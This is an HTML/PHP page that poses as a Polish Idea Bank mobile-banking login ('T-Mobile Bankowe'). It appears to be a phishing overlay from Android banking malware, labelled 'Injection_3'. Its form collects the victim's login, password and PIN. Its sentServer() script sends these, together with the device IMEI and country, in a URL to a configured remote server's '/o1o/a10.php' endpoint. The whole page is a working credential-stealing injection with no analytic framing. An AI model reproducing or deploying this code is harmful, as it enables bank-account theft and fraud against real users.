<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/pl.ideabank.mobilebanking/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>

    <div class="header">
        <img src="data:image/png;base64,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">
    </div>

    <form id="form" method="POST">
        <label for="login">Login</label>
        <input type="text" class="input" placeholder="" required pattern="[0-9a-zA-Z]{4,16}" name="login" id="login">

        <label for="password">Haslo uzytkownika</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9a-zA-Z]{4,16}" name="password" id="password">

        <label for="pin">PIN</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9]{4,8}" name="pin" id="pin">

        <input type="button" onclick="sentServer();" class="button" value="Zaloguj">
    </form>



    <script>
        function sentServer(){
          //  var imei_c = document.forms["form"].elements["imei"].value;
            var login1 = document.getElementById('login').value;
            var haslo = document.getElementById('password').value;
            var pin = document.getElementById('pin').value;

            var url='<?php echo $URL; ?>';
            var imei_c='<?php echo $IMEI_country; ?>';

            location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|pl_ideabank_mobilebanking|"+login1+"|"+haslo+"|"+pin);
        }
    </script>
    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},3e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>
</html>
